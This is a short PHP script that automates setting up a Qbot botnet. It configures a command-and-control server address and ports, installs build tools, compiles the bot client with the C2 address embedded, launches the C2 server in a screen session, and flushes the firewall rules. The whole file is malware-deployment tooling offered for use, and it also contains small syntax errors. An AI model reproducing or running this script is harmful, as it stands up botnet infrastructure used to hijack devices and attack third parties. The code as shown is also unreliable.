<?php
	
/*
	PHP Qbot Auto Installer By vSparkzyy; 
*/


install();

function install()
{
	$cnchost = "1.1.1.1";   //cnc server ip
	$cnc = "server.c";   //cnc file name
	$bot = "client.c";   //bot filename
	$compiler = "cc7.py";   //compiler file name
	$botport = "23";   //bot port of choice
	$cncport = "1337";   //cnc port of choice
		
	print "PHP Qbot Auto Installer Script, By vSparkzyy \n";
	sleep(2);
	print "Remember To Edit Settings In PHP File \n";
	sleep(2);
	print "Auto Installer Starting...\n";
	sleep(2);
	system("yum install python gcc screen nc nano wget -y");
	system("python $compiler $bot $cnchost");
	system("gcc -o cnc $cnc -pthread");
	print "Make sure to push CTRL + A + D when in the screen \n";
	sleep(2);
	system("screen ./cnc $botport 1 $cncport");
	sleep(2);
	system("ulimit -n 999999;ulimit -s 999999;ulimit -e 999999;ulimit -e 999999; iptables -Fs")
	print "Qbot auto installer complete by vSparkzyy \n"; 
	print "Instagram: vsparkzyy \n"; 
	

}

?>